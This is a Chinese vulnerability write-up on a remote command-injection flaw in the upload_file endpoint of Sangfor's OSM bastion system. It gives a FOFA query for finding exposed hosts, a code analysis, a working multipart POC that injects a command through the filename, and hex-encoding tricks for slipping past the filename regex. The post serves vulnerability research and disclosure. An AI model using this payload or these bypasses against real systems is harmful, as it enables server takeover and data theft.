---
title: "深信服运维安全管理系统 upload_file 远程命令执行漏洞"
source: https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html
asset_dir: assets/深信服运维安全管理系统-upload_file-远程命令执行漏洞
---

# 深信服运维安全管理系统 upload\_file 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/3/9 08:41
* 230浏览
* [0评论](#comment)
* 32分钟阅读

深入探索

软件

服务器

SQL


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

深信服运维安全管理系统 upload\_file 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。

文件大小转换

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"

# 漏洞分析

看下 `com.sbr.fort.foreignSXF.newSXF.NewUpgradeSXFController#uploadPatchFile`的实现逻辑

深入探索

SQL注入检测工具

Docker加速服务

安全工具开发

[![深信服运维安全管理系统 upload_file 远程命令执行漏洞](images/img-001-6c269ae2803d.webp)](https://image.mrxn.net/011b2144a06f4bc9bde17f0fbe27de14.webp)

文件上传的文件名部分`fileName` 会被带入 **CheckUpFile** 方法中，只有此方法返回 **success** 才会进入下面的处理逻辑，看下 **CheckUpFile** 方法的实现逻辑

漏洞扫描服务

[![深信服运维安全管理系统 upload_file 远程命令执行漏洞](images/img-002-2eda41ea6a35.webp)](https://image.mrxn.net/92725a64b808457b83bf68ffaa4c7d79.webp)

存在多个正则校验文件名是否合法

计算机服务器

* 如果包含 `Build` : `^([O]{1}[S]{1}[M]{1}[v]{1}[3]{1}[.]{1}[0]{1}[.]{1}[0-9]{1,3}[_]([0-9]{3}[1-9]|[0-9]{2}[1-9][0-9]{1}|[0-9]{1}[1-9][0-9]{2}|[1-9][0-9]{3})(((0[13578]|1[02])(0[1-9]|[12][0-9]|3[01]))|((0[469]|11)(0[1-9]|[12][0-9]|30))|(02(0[1-9]|[1][0-9]|2[0-8])))[_]{1}[B]{1}[u]{1}[i]{1}[l]{1}[d]{1}[v]{1}[3]{1}[.]{1}[0]{1}[.]{1}[0-9]{1,3})$`
* 如果不包含 `C` 但是包含 `R` ：`^([O]{1}[S]{1}[M]{1}[v]{1}[3]{1}[.]{1}[0]{1}[.]{1}[0-9]{1,3}[_]{1}[R]{1}[0-9]{1,3}[_]{1}([0-9]{3}[1-9]|[0-9]{2}[1-9][0-9]{1}|[0-9]{1}[1-9][0-9]{2}|[1-9][0-9]{3})(((0[13578]|1[02])(0[1-9]|[12][0-9]|3[01]))|((0[469]|11)(0[1-9]|[12][0-9]|30))|(02(0[1-9]|[1][0-9]|2[0-8]))))$`
* 如果包含`C` 但是不包含 `R` ：`^([O]{1}[S]{1}[M]{1}[v]{1}[3]{1}[.]{1}[0]{1}[.]{1}[0-9]{1,3}[_]{1}[C]{1}[_]{1}[0-9a-zA-Z]{1,9}[_]{1}([0-9]{3}[1-9]|[0-9]{2}[1-9][0-9]{1}|[0-9]{1}[1-9][0-9]{2}|[1-9][0-9]{3})(((0[13578]|1[02])(0[1-9]|[12][0-9]|3[01]))|((0[469]|11)(0[1-9]|[12][0-9]|30))|(02(0[1-9]|[1][0-9]|2[0-8]))))$`
* 如果同时包含 `C` 和 `R`： `^([O]{1}[S]{1}[M]{1}[v]{1}[3]{1}[.]{1}[0]{1}[.]{1}[0-9]{1,3}[_]{1}[C]{1}[_]{1}[0-9a-zA-Z]{1,9}[_][R]{1}[0-9]{1,3}[_]{1}([0-9]{3}[1-9]|[0-9]{2}[1-9][0-9]{1}|[0-9]{1}[1-9][0-9]{2}|[1-9][0-9]{3})(((0[13578]|1[02])(0[1-9]|[12][0-9]|3[01]))|((0[469]|11)(0[1-9]|[12][0-9]|30))|(02(0[1-9]|[1][0-9]|2[0-8]))))$`
* 如果包含 `Universal` ：`^([U]{1}[n]{1}[i]{1}[v]{1}[e]{1}[r]{1}[s]{1}[a]{1}[l]{1}[_]{1}[O]{1}[S]{1}[M]{1}[v]{1}[3]{1}[.]{1}[0]{1}[_]{1}([0-9]{3}[1-9]|[0-9]{2}[1-9][0-9]{1}|[0-9]{1}[1-9][0-9]{2}|[1-9][0-9]{3})(((0[13578]|1[02])(0[1-9]|[12][0-9]|3[01]))|((0[469]|11)(0[1-9]|[12][0-9]|30))|(02(0[1-9]|[1][0-9]|2[0-8]))))$`

等等判断，且每个小的处理逻辑里还有更细致的判断，复杂度不小，直接丢给[AI](https://mrxn.net/tag/%E5%A4%A7%E6%A8%A1%E5%9E%8B),鞭打它分析，这里以处理流程图来辅助分析，便于理解

[![深信服运维安全管理系统 upload_file 远程命令执行漏洞](images/img-003-dcb3e391cb58.webp)](https://image.mrxn.net/2e59e47c258a4135937fcd604b1cfeff.webp)

从上图看，最简单的最容易进行命令注入的就是最后一种情况，包含Universal格式的文件名，比如`filename="Universal_OSMv3.0_12340101;sleep 3"` 即可通过校验，返回 **success** 后，进入 `uploadPatchFile` 方法余下处理逻辑，经过一系列的判断，处理流程如下图所示

代码安全审计

[![深信服运维安全管理系统 upload_file 远程命令执行漏洞](images/img-004-8a98a030435a.webp)](https://image.mrxn.net/4393c74e10da43d1b14774f5cc0b4910.webp)

最终会进入如下判断处理处

[![深信服运维安全管理系统 upload_file 远程命令执行漏洞](images/img-005-1b7be2f76bd4.webp)](https://image.mrxn.net/264332b7b70449b38c076fcf73798901.webp)

可以看到 **fileName** 最终拼接在了 `String cmd = "bash /usr/local/bin/sh/node_patch_management.sh check " + fileName;` 后，调用 `ShellExecutor` 类的 `exe` 方法进行命令执行，从而造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[![深信服运维安全管理系统 upload_file 远程命令执行漏洞](images/img-006-95edf58edb9c.webp)](https://image.mrxn.net/4c6f5f6e3a4f4370a520ceda847556a4.webp)

## POC

```
POST /fort/cssp;help/v1/app/upload_file HTTP/1.1
Host: sangfor_osm.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="Universal_OSMv3.0_12340101;sleep 3"

123
------WebKitFormBoundary--
```

[![深信服运维安全管理系统 upload_file 远程命令执行漏洞](images/img-007-ca370a58005c.webp)](https://image.mrxn.net/c1ec82e97b654e4f93a6e542bfa2eeab.webp)

成功延时 3 秒

漏洞扫描服务

如果为了写入文件，避免因常见base64编码后的命令中存在大写字母 **C** 或者 **R** 导致不能通过正则校验，可以采用 **hex** 编码需要执行的命令，然后再用 **xxd -r -p** 进行解码执行，比如

执行 `echo 123 | tee /usr/local/tomcat/webapps/fort/trust/version/T1.txt` 这条命令，可以将其编码成 hex 格式： `6563686f20313233207c20746565202f7573722f6c6f63616c2f746f6d6361742f776562617070732f666f72742f74727573742f76657273696f6e2f54312e747874`

[![深信服运维安全管理系统 upload_file 远程命令执行漏洞](images/img-008-dc0f3b9256da.webp)](https://image.mrxn.net/cbae6fb0edad42d9945048b8a5a33078.webp)

查看命令执行结果文件

[![深信服运维安全管理系统 upload_file 远程命令执行漏洞](images/img-009-b37732183628.webp)](https://image.mrxn.net/7c147bb55edd46878d198c1a2d13acd2.webp)

如果目标出网，就比较简单了，就不赘述了。

如果确实需要使用base64编码内容写入，可以使用分段追加写入一个文件，然后遇到大写字母 `C` 或者 `R` 时，使用如下 `echo -n c | tr '[:lower:]' '[:upper:]'` 和 `echo -n R | tr '[:lower:]' '[:upper:]'` 命令来转换大小写后追加写入。

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)
* [#大模型](https://mrxn.net/tag/%E5%A4%A7%E6%A8%A1%E5%9E%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.POC](#toc-5-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)  
文章链接：<https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor\_osm-cssp-app-upload\_file-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 plus\_get\_favicon 任意文件上传漏洞](https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALTUlEQVR4Aeyd23bbuBJEtef///mctCqbIpqAKDuJpQdqDVKsSzdhNGVHycya/2632/++s/73+2Xtb7r1kour3Er/ap35wt6ztFrqYmnPljlxle2+/DtYA/lVd/3zKSewDeTX9G+vrNXGgRuwsjcduOe8lwZEl7+KkDp44Kr3Svde8OgBbOex8iF5/Y7e7wz3ddtA9uJ1/b4TOAwEMnUY8WyLPgXmYF7fcysOqdeHkat7vxnCWAPhZlc91CF5eUf7nCGkD4w4qzsMZBa6tJ87gT8eiE/NastnPuSpOcvZH5KHoHV7NKsmXyGk15kP89yr91n13+t/PJB9s+v6z0/grw0ExqfHpwaiy/uWv6r3ekh/OMd+L0hN172HuqgurnT97+BfG8h3bn7VHE/gMBCn3vFYGgUmT1ms+6/2uZPdL5A6CO6s+yVEh+Bd3P1i3xnuYi9dwngPmHPvBaN/dhPrOs7qDgOZhS7t505gGwhk6vAcv7o1SD/rINynRV2EuX+WB2yx4arGQPc7N3eGwP1PH3oOosNz3NdtA9mL1/X7TuA/n4qvYt8y5ClQh3D7qsth9OE5t76j/Qq71zk8vwfE73Wd171qdV1e3nfX9Q7xFD8EDwOBPCUwovuF6PJXEcY6nyCIfsb7fSB1cMSelfd7qIv6IqR35+Y7QvIw4qs54HYYyO16vfUE/oNxmj4NoruD5LreufmuyyF9IKhunQjx5aL5GfaMXISxpz1g1M3ry1e4ynUdch/1GV7vkNUpv0k//C4LMsW+H6cJow8jN9frOzcH83p98Xa73VtA8nDEe2D3CyTTe6w4JA8j2tI6iK8O4fqifkdIXh3CgetnyO3DXoefIav9Qabo9GHk6tZD/Ff5Kqe+Qu+7x1W26zDu0R6rHIx5c9bB6EM4BM2J1u/x+hmyP40PuF4OBOZThejuHcIhqO5TAKPefXPqHSH1EHzmd++st3lIbwiqr+rVIXkIqlsvqkNyENTf43Ig+9B1/XMnsA3EK